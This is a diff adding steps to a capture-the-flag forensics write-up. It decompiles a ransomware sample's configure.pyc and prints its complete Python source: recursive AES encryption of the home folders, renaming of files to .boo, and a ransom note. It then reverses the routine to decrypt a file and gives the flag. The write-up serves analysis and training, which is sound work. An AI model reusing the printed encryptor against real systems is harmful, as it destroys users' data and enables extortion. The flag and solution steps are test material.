@@ -101,9 +101,148 @@ Export Objects -> HTTP
 
 
 26. Open the extracted directory, our interest is at the configure.pyc file, we need to decompile that to py.
+27. I use [this](https://www.toolnb.com/tools-lang-en/pyc.html) online tool to decompile it.
+
+> DECOMPILED
+
+```py
+# uncompyle6 version 3.5.0
+# Python bytecode 3.6 (3379)
+# Decompiled from: Python 2.7.5 (default, Nov 16 2020, 22:23:17) 
+# [GCC 4.8.5 20150623 (Red Hat 4.8.5-44)]
+# Embedded file name: configure.py
+from Crypto.Cipher import AES
+from sys import exit
+import random, string, time, os
+
+def Pkrr1fe0qmDD9nKx(filename: str, data: bytes) -> None:
+    open(filename, 'wb').write(data)
+    os.rename(filename, f"{filename}.boo")
 
 
+def mv18jiVh6TJI9lzY(filename: str) -> None:
+    data = open(filename, 'rb').read()
+    key = 'vN0nb7ZshjAWiCzv'
+    iv = 'ffTC776Wt59Qawe1'
+    cipher = AES.new(key.encode('utf-8'), AES.MODE_CFB, iv)
+    ct = cipher.encrypt(data)
+    Pkrr1fe0qmDD9nKx(filename, ct)
 
+
+def w7oVNKAyN8dlWJk() -> str:
+    letters = string.ascii_lowercase + string.digits
+    _id = ''.join(random.choice(letters) for i in range(32))
+    return _id
+
+
+def print_note() -> None:
+    _id = w7oVNKAyN8dlWJk()
+    banner = f"\n\nPippity poppity give me your property!\n\n\t   *                  ((((\n*            *        *  (((\n\t   *                (((      *\n  *   / \\        *     *(((    \n   __/___\\__  *          (((\n\t (O)  |         *     ((((\n*  '<   ? |__ ... .. .             *\n\t \\@      \\    *    ... . . . *\n\t //__     \t// ||\\__   \\    |~~~~~~ . . .   *\n====M===M===| |=====|~~~~~~   . . .. .. .\n\t\t *  \\ \\ \\   |~~~~~~    *\n  *         <__|_|   ~~~~~~ .   .     ... .\n\t\nPOOF!\n\nDon't you speak English? Use https://translate.google.com/?sl=en&tl=es&op=translate \n\nYOU GOT TRICKED! Your home folder has been encrypted due to blind trust.\nTo decrypt your files, you need the private key that only we possess. \n\nYour ID: {_id}\n\nDon't waste our time and pay the ransom; otherwise, you will lose your precious files forever.\n\nWe accept crypto or candy.\n\nDon't hesitate to get in touch with cutie_pumpkin@ransomwaregroup.com during business hours.\n\n\t"
+    print(banner)
+    time.sleep(60)
+
+
+def yGN9pu2XkPTWyeBK(directory: str) -> list:
+    filenames = []
+    for filename in os.listdir(directory):
+        result = os.path.join(directory, filename)
+        if os.path.isfile(result):
+            filenames.append(result)
+        else:
+            filenames.extend(yGN9pu2XkPTWyeBK(result))
+
+    return filenames
+
+
+def main() -> None:
+    username = os.getlogin()
+    if username != 'developer13371337':
+        exit(1)
+    directories = [f"/home/{username}/Downloads",
+     f"/home/{username}/Documents",
+     f"/home/{username}/Desktop"]
+    for directory in directories:
+        if os.path.exists(directory):
+            files = yGN9pu2XkPTWyeBK(directory)
+            for fil in files:
+                try:
+                    mv18jiVh6TJI9lzY(fil)
+                except Exception as e:
+                    pass
+
+    print_note()
+
+
+if __name__ == '__main__':
+    main()
+```
+
+28. Well based from the source-code we know the encryption function is this -> `mv18jiVh6TJI9lzY()`
+
+```py
+def mv18jiVh6TJI9lzY(filename: str) -> None:
+    data = open(filename, 'rb').read()
+    key = 'vN0nb7ZshjAWiCzv'
+    iv = 'ffTC776Wt59Qawe1'
+    cipher = AES.new(key.encode('utf-8'), AES.MODE_CFB, iv)
+    ct = cipher.encrypt(data)
+    Pkrr1fe0qmDD9nKx(filename, ct)
+```
+
+![image](https://user-images.githubusercontent.com/70703371/233849039-aa4a8b75-0e8f-486f-bce9-e4a08156696c.png)
+
+
+29. Now they want us to decrypt the given file -> which is the .boo file and get the md5sum.
+30. To decrypt it, we can reverse the algorithm used for encrypt the file.
+
+> REVERSED SCRIPT
+
+```py
+from Crypto.Cipher import AES
+from sys import exit
+import random, string, time, os
+
+os.system('clear')
+
+## the decrypt function
+def mv18jiVh6TJI9lzY(filename):
+    data = open(filename, 'rb').read()
+    key = 'vN0nb7ZshjAWiCzv'
+    iv = b'ffTC776Wt59Qawe1' # must bytes
+    cipher = AES.new(key.encode('utf-8'), AES.MODE_CFB, iv)
+    ct = cipher.decrypt(data)
+    Pkrr1fe0qmDD9nKx('new_boo', ct)
+
+## to write out the output
+def Pkrr1fe0qmDD9nKx(filename, data):
+    open(filename, 'wb').write(data)
+    #os.rename(filename, f"{filename}.boo")
+
+mv18jiVh6TJI9lzY('candy_dungeon.pdf.boo')
+```
+
+> OUTPUT
+
+![image](https://user-images.githubusercontent.com/70703371/233849781-11441418-f08c-4cfb-84ab-69da88b0c9b8.png)
+
+
+> Get md5sum
+
+![image](https://user-images.githubusercontent.com/70703371/233849794-0ff9fe95-1ef1-4b69-9aa9-41a055d8c821.png)
+
+
+> Send it
+
+![image](https://user-images.githubusercontent.com/70703371/233849803-6379ee37-1c02-4713-9405-33180da01380.png)
+
+
+31. Got the flag!
+
+## FLAG
+
+```
+HTB{Th1s_h4ll0w33n_w4s_r34lly_sp00ky}
+```
 
 
 
